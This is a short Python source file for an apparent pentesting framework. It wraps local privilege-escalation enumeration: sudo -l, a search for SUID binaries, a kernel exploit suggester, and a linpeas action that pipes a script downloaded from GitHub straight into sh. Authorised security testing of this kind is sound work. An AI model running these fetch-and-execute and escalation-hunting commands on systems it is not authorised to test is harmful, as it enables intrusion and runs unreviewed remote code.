"""Privilege escalation enumeration tool — linpeas, winpeas, sudo checks."""

from __future__ import annotations

import logging
from typing import Any

from tools.base import BasePentestTool

logger = logging.getLogger(__name__)


class PrivEscTool(BasePentestTool):
    """Wrapper for privilege escalation enumeration tools."""

    name = "priv_esc"
    description = (
        "Privilege escalation enumeration — linpeas, winpeas, sudo checks, "
        "SUID binary discovery, kernel exploit suggestions."
    )

    ACTIONS: dict[str, dict[str, Any]] = {
        "linpeas": {
            "cmd": [
                "bash",
                "-c",
                "curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
            ],
            "timeout": 300,
            "description": "Run linpeas for Linux privilege escalation enumeration",
        },
        "sudo_check": {
            "cmd": ["sudo", "-l"],
            "timeout": 10,
            "description": "List sudo privileges for current user",
        },
        "suid_find": {
            "cmd": ["find", "/", "-perm", "-4000", "-type", "f", "-exec", "ls", "-la", "{}", ";"],
            "timeout": 60,
            "description": "Find SUID binaries",
        },
        "kernel_exploits": {
            "cmd": ["linux-exploit-suggester"],
            "timeout": 60,
            "description": "Suggest kernel exploits based on kernel version",
        },
    }

    async def execute(
        self,
        action: str,
        timeout: int = 300,
    ) -> str:
        if action not in self.ACTIONS:
            return self._unknown_action(action)

        spec = self.ACTIONS[action]
        effective_timeout = spec.get("timeout", 300)

        return await self._run(
            action=action,
            cmd=spec["cmd"],
            timeout=effective_timeout,
            target_hint="localhost",
        )
